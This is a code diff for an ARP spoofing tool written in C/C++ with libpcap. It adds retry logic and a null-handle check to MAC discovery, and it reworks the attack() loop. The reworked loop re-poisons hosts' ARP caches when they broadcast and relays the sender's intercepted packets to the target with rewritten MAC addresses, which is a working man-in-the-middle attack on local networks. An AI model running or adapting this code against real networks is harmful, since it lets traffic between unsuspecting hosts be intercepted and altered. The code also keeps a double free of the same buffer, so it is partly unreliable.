@@ -18,7 +18,7 @@ int GetSvrMacAddress(Address_info *addressinfo)
     struct ifreq *ifr; // Interface request
     struct ifconf ifc;
     char ipstr[40];
-    int i, numif, tmpIP;
+    uint32_t tmpIP, numif, i;
 
     memset(&ifc, 0, sizeof(ifc));
     ifc.ifc_ifcu.ifcu_req = nullptr;
@@ -41,7 +41,6 @@ int GetSvrMacAddress(Address_info *addressinfo)
         for (i = 0; i < numif; i++)
         {
             struct ifreq *r = &ifr[i];
-            struct sockaddr_in *sin = reinterpret_cast<struct sockaddr_in *>(&r->ifr_addr);
 
             if (!strcmp(r->ifr_name, addressinfo->interface))
             {
@@ -80,14 +79,20 @@ int GetTargetMacAddress(Address_info *addressinfo)
     SetARPPacket(arpPacketToTarget, ARP_REQUEST, addressinfo, TARGET);
 
     pcap_t* handle = pcap_open_live(addressinfo->interface, BUFSIZ, 1, 1, errbuf);
+    if(handle == nullptr)
+    {
+        printf("[-] Error! Can't open %s's handle!\n",addressinfo->interface);
+        return 0;
+    }
     pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToSender), ARP_PACKET_SIZE);
     pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToTarget), ARP_PACKET_SIZE);
 
-    int threshhold = 0;
+    int retry = 0;
     int flag = 0;
+    const int threshhold = 1000;
     while (true)
     {
-        threshhold++;
+        retry++;
         struct pcap_pkthdr* header;
         const u_char* packet;
         const ARP_Packet *p;
@@ -110,12 +115,17 @@ int GetTargetMacAddress(Address_info *addressinfo)
         }
         if (flag == 3)
             break;
-        else if(threshhold >1000)
+        else if(retry > threshhold)
         {
             free(arpPacketToSender);
             free(arpPacketToSender);
             pcap_close(handle);
             return 0;
+        }
+        else if(retry % 30 == 0)
+        {
+            pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToSender), ARP_PACKET_SIZE);
+            pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToTarget), ARP_PACKET_SIZE);
         }
     }
     free(arpPacketToSender);
@@ -173,22 +183,47 @@ void attack(Address_info *addressinfo)
     {
         struct pcap_pkthdr* header;
         const u_char* packet;
-        const Eth_header *eth;
+        Eth_header *eth;
         const ARP_Packet *arp;
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
-        eth = reinterpret_cast<const Eth_header*>(packet);
+        eth =const_cast<Eth_header*>(reinterpret_cast<const Eth_header*>(packet));
         arp = reinterpret_cast<const ARP_Packet*>(packet);
-        //case 1. Relay
-        if(memcmp(eth->eth_dst, addressinfo->hostMac, MAC_ADDR_LEN) == 0)
+
+        //case 1. Re-Spoofing
+        if ( eth->eth_type == htons(0x0806))
         {
-            memcpy(const_cast<Eth_header *>(eth)->eth_dst, addressinfo->targetMac, MAC_ADDR_LEN);
-            pcap_sendpacket(handle, packet, sizeof(*packet));
+            // target broadcast to find sender
+            if( memcmp(eth->eth_src, &addressinfo->targetMac,    MAC_ADDR_LEN) == 0 &&
+                memcmp(eth->eth_dst, "\xff\xff\xff\xff\xff\xff", MAC_ADDR_LEN) == 0 )
+            {
+                printf("ARP from target detected!!! Trying Re-Spoofing..");
+                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
+                printf("Done!!\n");
+            }
+            // sender broadcast or unicast to find target
+            else if ( memcmp(arp->DST_IP_ADDR, &addressinfo->targetIp , IP_ADDR_LEN ) == 0 &&
+                      memcmp(eth->eth_src,     &addressinfo->senderMac, MAC_ADDR_LEN) == 0)
+            {
+                printf("ARP from sender detected!!! Trying Re-Spoofing..");
+                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
+                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
+                usleep(100);
+                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
+                printf("Done!!\n");
+            }
         }
-        //case 2. Re-Spoofing
-        else if ( eth->eth_type == htons(0x0806) && memcmp(arp->SRC_IP_ADDR, &addressinfo->targetIp, IP_ADDR_LEN) == 0 )
-            pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
+
+        //case 2. Relay
+        else if(eth->eth_type != htons(0x0806) && memcmp(eth->eth_src, addressinfo->senderMac, MAC_ADDR_LEN) == 0)
+        {
+            printf("Packet from sender detected!!! packet size : %d Trying Relay..", header->len);
+            memcpy(eth->eth_dst, addressinfo->targetMac, MAC_ADDR_LEN);
+            memcpy(eth->eth_src, addressinfo->hostMac, MAC_ADDR_LEN);
+            pcap_sendpacket(handle, packet, header->len);
+            printf("Done!!\n");
+        }
         else
             continue;
 
